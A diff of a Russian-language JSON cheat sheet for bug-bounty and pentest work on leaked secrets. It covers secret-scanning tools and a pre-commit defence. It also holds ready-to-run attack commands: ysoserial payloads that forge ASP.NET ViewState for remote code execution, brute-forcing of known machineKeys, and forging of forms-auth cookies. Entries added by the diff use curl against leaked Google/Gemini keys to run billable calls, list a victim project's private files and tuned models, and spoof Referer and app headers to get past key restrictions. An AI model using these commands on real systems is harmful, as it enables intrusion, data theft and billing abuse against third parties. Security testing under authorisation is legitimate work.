@@ -6,108 +6,170 @@
       "subcategory": "Методология",
       "title": "Где утекают ключи и токены (основные причины)",
       "language": "text",
-      "tags": ["methodology", "recon", "secrets"],
+      "tags": [
+        "methodology",
+        "recon",
+        "secrets"
+      ],
       "body": "API-ключи и токены — это аутентификация к публичным и приватным сервисам. Утечка → несанкционированный доступ, компрометация, слив данных.\n\nГде искать:\n• Хардкод в исходниках — ключ забыли прямо в коде (api_key = \"1234567890abcdef\").\n• Публичные репозитории — секреты случайно закоммичены в GitHub (история коммитов, issues, PR).\n• Docker-образы — ключи зашиты в образы на DockerHub / приватных реестрах.\n• Логи и debug-вывод — ключи попадают в логи при отладке.\n• Конфиги — .env, config.json, settings.py, .aws/credentials и т.п. в публичном доступе."
     },
     {
       "subcategory": "Методология",
       "title": "API-ключи vs токены",
       "language": "text",
-      "tags": ["methodology", "tokens"],
+      "tags": [
+        "methodology",
+        "tokens"
+      ],
       "body": "API Keys — уникальные идентификаторы для аутентификации запросов проекта/приложения.\nTokens — токены безопасности (например OAuth), дающие доступ к защищённым ресурсам."
     },
     {
       "subcategory": "Тулзы",
       "title": "Инструменты для поиска секретов и валидации",
       "language": "text",
-      "tags": ["tools", "secrets"],
+      "tags": [
+        "tools",
+        "secrets"
+      ],
       "body": "trufflesecurity/truffleHog — ищет креды где угодно (репо, docker, файлы).\nstreaak/keyhacks — как быстро проверить, валиден ли утёкший на bug bounty ключ.\nmomenbasel/KeyFinder — находит ключи прямо при сёрфинге.\nmazen160/secrets-patterns-db — крупнейшая open-source база regex-паттернов секретов/ключей/паролей.\nblacklanternsecurity/badsecrets — детект известных/слабых секретов на многих платформах.\nirsdl/crapsecrets — детект известных секретов в разных веб-фреймворках.\nd0ge/sign-saboteur — Burp-расширение для правки/подписи/проверки подписанных веб-токенов.\naquasecurity/trivy — сканер уязвимостей и мисконфигов, заодно ищет API-ключи/секреты.\nprojectdiscovery/nuclei-templates — шаблоны token-spray: прогнать токен по множеству API-эндпоинтов."
     },
     {
       "subcategory": "Тулзы",
       "title": "nuclei — token-spray (проверка токена по множеству API)",
       "language": "bash",
-      "tags": ["tools", "nuclei", "token-spray"],
+      "tags": [
+        "tools",
+        "nuclei",
+        "token-spray"
+      ],
       "body": "nuclei -t token-spray/ -var token=token_list.txt"
     },
     {
       "subcategory": "Поиск в репозиториях",
       "title": "trufflehog — скан GitHub-организации",
       "language": "bash",
-      "tags": ["trufflehog", "github", "secrets"],
+      "tags": [
+        "trufflehog",
+        "github",
+        "secrets"
+      ],
       "body": "## Scan a Github Organization\ndocker run --rm -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --org=trufflesecurity"
     },
     {
       "subcategory": "Поиск в репозиториях",
       "title": "trufflehog — скан репозитория с issues и PR",
       "language": "bash",
-      "tags": ["trufflehog", "github", "secrets"],
+      "tags": [
+        "trufflehog",
+        "github",
+        "secrets"
+      ],
       "body": "## Scan a GitHub Repository, its Issues and Pull Requests\ndocker run --rm -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments"
     },
     {
       "subcategory": "Поиск в репозиториях",
       "title": "trufflehog — скан Docker-образа",
       "language": "bash",
-      "tags": ["trufflehog", "docker", "secrets"],
+      "tags": [
+        "trufflehog",
+        "docker",
+        "secrets"
+      ],
       "body": "# Scan a Docker image for verified secrets\ndocker run --rm -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets"
     },
     {
       "subcategory": "Валидация ключа",
       "title": "Определение сервиса по regex (secrets-patterns-db)",
       "language": "text",
-      "tags": ["validation", "regex", "secrets"],
+      "tags": [
+        "validation",
+        "regex",
+        "secrets"
+      ],
       "body": "Если непонятно, какой сервис выдал токен — сверь его с regex-паттернами из mazen160/secrets-patterns-db (крупнейшая open-source база паттернов секретов)."
     },
     {
       "subcategory": "Валидация ключа",
       "title": "Пример regex-паттернов (AWS API Gateway / AWS API Key)",
       "language": "text",
-      "tags": ["validation", "regex", "aws"],
+      "tags": [
+        "validation",
+        "regex",
+        "aws"
+      ],
       "body": "patterns:\n  - pattern:\n      name: AWS API Gateway\n      regex: '[0-9a-z]+.execute-api.[0-9a-z._-]+.amazonaws.com'\n      confidence: low\n  - pattern:\n      name: AWS API Key\n      regex: AKIA[0-9A-Z]{16}\n      confidence: high"
     },
     {
       "subcategory": "Валидация ключа",
       "title": "Проверка валидности — keyhacks и доки сервиса",
       "language": "text",
-      "tags": ["validation", "keyhacks"],
+      "tags": [
+        "validation",
+        "keyhacks"
+      ],
       "body": "Используй streaak/keyhacks или читай документацию сервиса, чтобы быстро проверить, валиден ли API-ключ."
     },
     {
       "subcategory": "Валидация ключа",
       "title": "Пример валидации — Telegram Bot API Token",
       "language": "bash",
-      "tags": ["validation", "telegram"],
+      "tags": [
+        "validation",
+        "telegram"
+      ],
       "body": "curl https://api.telegram.org/bot<TOKEN>/getMe"
     },
     {
       "subcategory": "Снижение поверхности атаки",
       "title": "pre-commit — детект ключей до коммита",
       "language": "text",
-      "tags": ["defense", "pre-commit"],
+      "tags": [
+        "defense",
+        "pre-commit"
+      ],
       "body": "Перед коммитом проверяй наличие приватных ключей и AWS-кредов. Добавь в .pre-commit-config.yaml:\n\n-   repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v3.2.0\n    hooks:\n    -   id: detect-aws-credentials\n    -   id: detect-private-key"
     },
-
     {
       "subcategory": "IIS Machine Keys",
       "title": "Что такое machineKey и зачем он атакующему",
       "language": "text",
-      "tags": ["iis", "aspnet", "viewstate"],
+      "tags": [
+        "iis",
+        "aspnet",
+        "viewstate"
+      ],
       "body": "machineKey в IIS/ASP.NET задаёт криптоключи и алгоритмы для шифрования и валидации данных: ViewState, cookie forms-аутентификации, out-of-process session state.\n\nЕсли ты знаешь machineKey (validationKey/decryptionKey) приложения — можешь подделать ViewState и довести до RCE через десериализацию, а также править cookie forms-аутентификации."
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Формат ViewState (по флагам MAC/шифрования)",
       "language": "table",
-      "tags": ["iis", "viewstate", "fingerprint"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "fingerprint"
+      ],
       "body": "",
       "meta": {
         "kind": "table",
         "table": {
-          "headers": ["Формат", "Свойства"],
+          "headers": [
+            "Формат",
+            "Свойства"
+          ],
           "rows": [
-            ["Base64", "EnableViewStateMac=False, ViewStateEncryptionMode=False"],
-            ["Base64 + MAC", "EnableViewStateMac=True"],
-            ["Base64 + Encrypted", "ViewStateEncryptionMode=True"]
+            [
+              "Base64",
+              "EnableViewStateMac=False, ViewStateEncryptionMode=False"
+            ],
+            [
+              "Base64 + MAC",
+              "EnableViewStateMac=True"
+            ],
+            [
+              "Base64 + Encrypted",
+              "ViewStateEncryptionMode=True"
+            ]
           ]
         }
       }
@@ -116,134 +178,257 @@
       "subcategory": "IIS Machine Keys",
       "title": "Признаки ViewState",
       "language": "text",
-      "tags": ["iis", "viewstate", "recon"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "recon"
+      ],
       "body": "ViewState хранит состояние веб-контролов между постбэками в скрытом поле страницы.\n\n• До сентября 2014 свойство enableViewStateMac по умолчанию было False.\n• Незашифрованный ViewState обычно начинается со строки /wEP."
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Формат элемента machineKey",
       "language": "xml",
-      "tags": ["iis", "aspnet", "config"],
+      "tags": [
+        "iis",
+        "aspnet",
+        "config"
+      ],
       "body": "<machineKey validationKey=\"[String]\"  decryptionKey=\"[String]\" validation=\"[SHA1 (default) | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]\"  decryption=\"[Auto (default) | DES | 3DES | AES | alg:algorithm_name]\" />"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Пример machineKey (из доков Microsoft)",
       "language": "xml",
-      "tags": ["iis", "aspnet", "config"],
+      "tags": [
+        "iis",
+        "aspnet",
+        "config"
+      ],
       "body": "<machineKey validationKey=\"87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC\" decryptionKey=\"E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7\" validation=\"SHA1\" />"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Где лежат web.config / machine.config",
       "language": "text",
-      "tags": ["iis", "aspnet", "locations"],
+      "tags": [
+        "iis",
+        "aspnet",
+        "locations"
+      ],
       "body": "32-bit:\n  C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\config\\machine.config\n  C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\config\\machine.config\n64-bit:\n  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config\n  C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\config\\machine.config\nВ реестре, когда включён AutoGenerate (вытащить через irsdl/machineKeyFinder.aspx):\n  HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4\n  HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Подбор известного machineKey — badsecrets / blacklist3r",
       "language": "bash",
-      "tags": ["iis", "viewstate", "badsecrets"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "badsecrets"
+      ],
       "body": "python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6\n# Matching MachineKeys found!\n# validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE validationAlgo: SHA1"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Подбор известного machineKey — viewstalker",
       "language": "bash",
-      "tags": ["iis", "viewstate", "viewstalker"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "viewstalker"
+      ],
       "body": "./viewstalker --viewstate /wEPD...TYQ== -m 3E92B2D6 -M ./MachineKeys2.txt\n# KEY FOUND!!!\n# Validation Key: XXXXX,XXXXX"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Подбор известного machineKey — crapsecrets",
       "language": "bash",
-      "tags": ["iis", "viewstate", "crapsecrets"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "crapsecrets"
+      ],
       "body": "python3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -r\npython3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -mrd 5\npython3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -u http://update.microsoft.com/\npython3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -u http://10.10.10.10:8080/\npython3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -mkf ./crapsecrets/resources/aspnet_machinekeys.txt -u http://10.10.10.10:8080/a1/b/c1/"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Подбор известного machineKey — Blacklist3r (AspDotNetWrapper)",
       "language": "bash",
-      "tags": ["iis", "viewstate", "blacklist3r"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "blacklist3r"
+      ],
       "body": "AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Подбор известного machineKey — viewgen --guess",
       "language": "bash",
-      "tags": ["iis", "viewstate", "viewgen"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "viewgen"
+      ],
       "body": "$ viewgen --guess \"/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI=\"\n[+] ViewState is not encrypted\n[+] Signature algorithm: SHA1"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Списки известных machineKey (wordlists)",
       "language": "text",
-      "tags": ["iis", "viewstate", "wordlist"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "wordlist"
+      ],
       "body": "Готовые списки ключей для перебора:\n• NotSoSecure/Blacklist3r/MachineKeys.txt\n• isclayton/viewstalker/MachineKeys2.txt\n• blacklanternsecurity/badsecrets/aspnet_machinekeys.txt\n\nПримечание ARS3NAL: локальная копия NotSoSecure/Blacklist3r есть в Files/MachineKeys.txt (~3570 пар validationKey,decryptionKey)."
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Декод ViewState — viewgen",
       "language": "bash",
-      "tags": ["iis", "viewstate", "viewgen", "decode"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "viewgen",
+        "decode"
+      ],
       "body": "viewgen --decode --check --webconfig web.config --modifier CA0B0334 \"zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=\""
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Генерация ViewState для RCE — требования",
       "language": "text",
-      "tags": ["iis", "viewstate", "rce", "deserialization"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "rce",
+        "deserialization"
+      ],
       "body": "Сначала декодируй ViewState, чтобы понять, включены ли MAC и шифрование.\n\nДля эксплуатации нужны:\n• __VIEWSTATE\n• __VIEWSTATEGENERATOR"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "RCE: MAC выключен (ysoserial)",
       "language": "bash",
-      "tags": ["iis", "viewstate", "rce", "ysoserial"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "rce",
+        "ysoserial"
+      ],
       "body": "ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c \"cmd /c whoami\""
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "RCE: MAC включён, шифрование выключено — извлечь ключ",
       "language": "bash",
-      "tags": ["iis", "viewstate", "rce", "blacklist3r"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "rce",
+        "blacklist3r"
+      ],
       "body": "AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy\n# --modifier = `__VIEWSTATEGENERATOR` parameter value\n# --encrypteddata = `__VIEWSTATE` parameter value of the target application"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "RCE: MAC включён, шифрование выключено — сгенерировать ViewState",
       "language": "bash",
-      "tags": ["iis", "viewstate", "rce", "ysoserial"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "rce",
+        "ysoserial"
+      ],
       "body": ".\\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --generator=CA0B0334 --validationalg=\"SHA1\" --validationkey=\"C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45\"\n.\\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"cmd /c whoami\" --generator=3E92B2D6 --validationalg=\"SHA1\" --validationkey=\"C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45\"\n\n# --generator = `__VIEWSTATEGENERATOR` parameter value\n# --validationkey = validation key from the previous command"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "RCE: MAC и шифрование включены — заметки",
       "language": "text",
-      "tags": ["iis", "viewstate", "rce"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "rce"
+      ],
       "body": "По умолчанию: валидация HMACSHA256, дешифрование AES.\n\nЕсли __VIEWSTATEGENERATOR отсутствует, но приложение на .NET Framework <= 4.0, можно указать корень приложения (например --apppath=\"/testaspx/\").\n\n• .NET Framework < 4.5 — ASP.NET всё равно принимает незашифрованный __VIEWSTATE, если убрать из запроса параметр __VIEWSTATEENCRYPTED.\n• .NET Framework > 4.5 — у machineKey свойство compatibilityMode=\"Framework45\"."
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "RCE: MAC+шифрование, .NET < 4.5 (убрать __VIEWSTATEENCRYPTED)",
       "language": "bash",
-      "tags": ["iis", "viewstate", "rce", "ysoserial"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "rce",
+        "ysoserial"
+      ],
       "body": ".\\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"cmd /c whoami\" --apppath=\"/testaspx/\" --islegacy --validationalg=\"SHA1\" --validationkey=\"70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0\" --isdebug"
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "RCE: MAC+шифрование, .NET > 4.5 (Framework45)",
       "language": "bash",
-      "tags": ["iis", "viewstate", "rce", "ysoserial"],
+      "tags": [
+        "iis",
+        "viewstate",
+        "rce",
+        "ysoserial"
+      ],
       "body": ".\\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --path=\"/somepath/testaspx/test.aspx\" --apppath=\"/testaspx/\" --decryptionalg=\"AES\" --decryptionkey=\"34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887\" --validationalg=\"HMACSHA256\" --validationkey=\"70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0\""
     },
     {
       "subcategory": "IIS Machine Keys",
       "title": "Правка cookie через machineKey (если ViewState отключён)",
       "language": "bash",
-      "tags": ["iis", "aspnet", "cookie", "forms-auth"],
+      "tags": [
+        "iis",
+        "aspnet",
+        "cookie",
+        "forms-auth"
+      ],
       "body": "# decrypt cookie\n$ AspDotNetWrapper.exe --keypath C:\\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes\n\n# encrypt cookie (edit Decrypted.txt)\n$ AspDotNetWrapper.exe --decryptDataFilePath C:\\DecryptedText.txt"
+    },
+    {
+      "subcategory": "Google / Gemini API",
+      "title": "Google / Gemini API-ключ (AIza) - что делать с утёкшим",
+      "language": "text",
+      "tags": [
+        "api-key-leaks",
+        "google",
+        "gemini",
+        "aiza",
+        "methodology"
+      ],
+      "body": "Утёкший ключ AIza... - один формат ключа Google на все API (Maps, Generative Language / Gemini, YouTube Data, Firebase). Ключ аутентифицирует ПРОЕКТ, не юзера: держатель может звать любой включённый на проекте API в пределах ограничений ключа. Импакт для баунти: несанкционированное billable-использование (LLM / Maps счёт жертвы) + утечка данных (чужие Files / cachedContents / приватные fine-tuned модели).\n\nОграничения ключа бывают трёх видов: HTTP-referrer (browser-ключи), application (Android package+cert / iOS bundle-id), IP. Первые два проверяются по ЗАГОЛОВКАМ запроса (Referer, X-Android-Package+X-Android-Cert, X-Ios-Bundle-Identifier), а не-браузерный клиент (curl) шлёт их произвольными -> referrer- и app-ограничения СПУФЯТСЯ. Только IP-ограничение не обходится заголовком.\n\nВалидируй сервис-агностично через ListModels (GET .../v1beta/models?key=KEY) - не зависит от имени модели. Коды: 200 = валиден + API включён; 403 REQUEST_DENIED / referer = валиден, но ограничен -> пробуй bypass; 400 API_KEY_INVALID = мёртв; 403 SERVICE_DISABLED = живой, но этот API не включён -> пивоть на другой (Maps).\n\nFirebase web-config ключи - тот же AIza и «не секрет» by design: тестируй, но голый Firebase-ключ часто триажат как info, если он не открывает billable API. Regex детекта: AIza[0-9A-Za-z_-]{35}."
+    },
+    {
+      "subcategory": "Google / Gemini API",
+      "title": "Gemini / Maps: валидация + billable-вызов + утечка данных (curl)",
+      "language": "bash",
+      "tags": [
+        "api-key-leaks",
+        "gemini",
+        "maps",
+        "validation",
+        "billing"
+      ],
+      "body": "KEY=AIza...\n\n# Валидация (сервис-агностично, предпочтительно - не зависит от имени модели):\ncurl \"https://generativelanguage.googleapis.com/v1beta/models?key=$KEY\"\n\n# Billable LLM-вызов (PoC несанкц. оплаты). Бери ТЕКУЩУЮ модель из ListModels: имена мрут (gemini-1.5/2.0-flash уже 404).\n# На 2026-07 живы: gemini-2.5-flash / gemini-2.5-flash-lite / gemini-2.5-pro.\ncurl \"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=$KEY\" \\\n  -H 'Content-Type: application/json' -X POST \\\n  -d '{\"contents\":[{\"parts\":[{\"text\":\"Reply with the single word: confirmed\"}]}]}'\n\n# Утечка приватных ассетов чужого проекта:\ncurl \"https://generativelanguage.googleapis.com/v1beta/files?key=$KEY\"\ncurl \"https://generativelanguage.googleapis.com/v1beta/cachedContents?key=$KEY\"\ncurl \"https://generativelanguage.googleapis.com/v1beta/tunedModels?key=$KEY\"\n\n# Maps billing-abuse (самые дорогие - Directions / DistanceMatrix / Places / Geocode):\ncurl \"https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood&key=$KEY\"\ncurl \"https://maps.googleapis.com/maps/api/geocode/json?address=NYC&key=$KEY\"\n\n# Один 200 = достаточный PoC. НЕ гоняй в цикле, чтобы не накручивать жертве счёт."
+    },
+    {
+      "subcategory": "Google / Gemini API",
+      "title": "Google API-ключ: обход referrer / app-ограничения",
+      "language": "bash",
+      "tags": [
+        "api-key-leaks",
+        "google",
+        "bypass",
+        "referer",
+        "android"
+      ],
+      "body": "KEY=AIza...\n\n# Обход HTTP-referrer-ограничения: подставь разрешённый Referer (домен, где нашёл ключ, или его *.wildcard).\ncurl -e \"https://ALLOWED-DOMAIN/\" \"https://generativelanguage.googleapis.com/v1beta/models?key=$KEY\"\n# Для Maps JavaScript API добавь ещё Origin:\ncurl \"https://maps.googleapis.com/maps/api/staticmap?center=45,10&zoom=7&size=400x400&key=$KEY\" \\\n  -H \"Referer: https://ALLOWED-DOMAIN/\" -H \"Origin: https://ALLOWED-DOMAIN\"\n\n# Обход application-ограничения (Android): подделай package + SHA1 подписи.\n#   package -> AndroidManifest.xml ; cert SHA1 -> apksigner verify --print-certs app.apk\ncurl \"https://maps.googleapis.com/maps/api/geocode/json?address=NYC&key=$KEY\" \\\n  -H \"X-Android-Package: com.example.app\" -H \"X-Android-Cert: 1A2B3C4D5E6F...FULL_SHA1_HEX\"\n\n# iOS: подделай bundle id (Info.plist CFBundleIdentifier):\ncurl \"https://maps.googleapis.com/maps/api/geocode/json?address=NYC&key=$KEY\" \\\n  -H \"X-Ios-Bundle-Identifier: com.example.app\"\n\n# Тулзы: ozguralp/gmapsapiscanner (python maps_api_scanner.py --api-key KEY), streaak/keyhacks.\n# Только IP-ограничение заголовком не обойти."
     }
   ]
 }
